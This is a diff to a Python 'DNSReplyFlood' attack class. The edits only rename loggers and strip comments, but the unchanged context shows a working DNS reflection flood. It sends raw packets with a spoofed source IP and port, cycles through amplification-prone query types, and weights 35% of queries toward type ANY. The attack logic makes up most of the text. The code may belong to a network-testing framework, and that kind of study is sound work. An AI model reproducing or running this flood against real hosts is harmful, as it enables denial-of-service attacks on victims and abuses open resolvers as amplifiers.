@@ -157,36 +157,33 @@ class DNSReplyFlood(AttackStrategy):
             "amazon.com",
         ]
         self.query_types = query_types or [
-            2,   # NS
+            2,  # NS
             15,  # MX
             16,  # TXT
             46,  # RRSIG
             48,  # DNSKEY
-            255, # ANY
+            255,  # ANY
         ]
 
         # Setup file logger (decoupled from console logger)
         log_path = log_file if log_file else "./dns_reply_flood_attack.log"
-        self.file_logger = logging.getLogger("DNS_REPLY_FLOOD")
+        self.file_logger = logging.getLogger("DNS_REPLY_FLOOD_FILE")
         self.file_logger.setLevel(logging.INFO)
         fh = logging.FileHandler(log_path)
         fh.setFormatter(
             logging.Formatter("[%(asctime)s] %(name)s - %(levelname)s - %(message)s")
         )
-        # Remove all handlers before adding
         self.file_logger.handlers.clear()
         self.file_logger.addHandler(fh)
-        # Prevent propagation to root logger (so file logs don't show in console)
         self.file_logger.propagate = False
 
         # Setup console logger (for progress only)
-        self.console_logger = logging.getLogger("DNS_REPLY_FLOOD")
+        self.console_logger = logging.getLogger("DNS_REPLY_FLOOD_CONSOLE")
         self.console_logger.setLevel(logging.INFO)
         self.console_logger.handlers.clear()
         ch = logging.StreamHandler()
         ch.setFormatter(logging.Formatter("%(message)s"))
         self.console_logger.addHandler(ch)
-        # Prevent propagation to root logger (so console logs don't show in file)
         self.console_logger.propagate = False
 
     def _load_zone_domains(self):
@@ -321,7 +318,6 @@ class DNSReplyFlood(AttackStrategy):
             sock.sendto(complete_packet, (self.target_ip, 0))
             sock.close()
             self.packets_sent += 1
-            # Log DNS request to file only
             req_info = {
                 "timestamp": time.time(),
                 "query_name": domain,
@@ -335,7 +331,6 @@ class DNSReplyFlood(AttackStrategy):
             return True
         except Exception as e:
             err_msg = f"Error sending DNS query: {e}"
-            # Only print errors to console
             console.print(f"[red]{err_msg}[/red]")
             self.file_logger.error(err_msg)
             return False
@@ -358,14 +353,13 @@ class DNSReplyFlood(AttackStrategy):
         while self.attack_active:
             try:
                 domain = self._pick_query_domain()
-                # Increase probability of sending ANY (type 255) requests
                 if random.random() < 0.35:
                     qtype = 255  # ANY
                 else:
                     qtype = random.choice(self.query_types)
                 spoofed_port = (
                     self.spoofed_port
-                )  # Always use the target port for sending
+                )
                 self._send_dns_query(self.spoofed_ip, spoofed_port, domain, qtype)
                 time.sleep(0.01)
             except Exception as e:
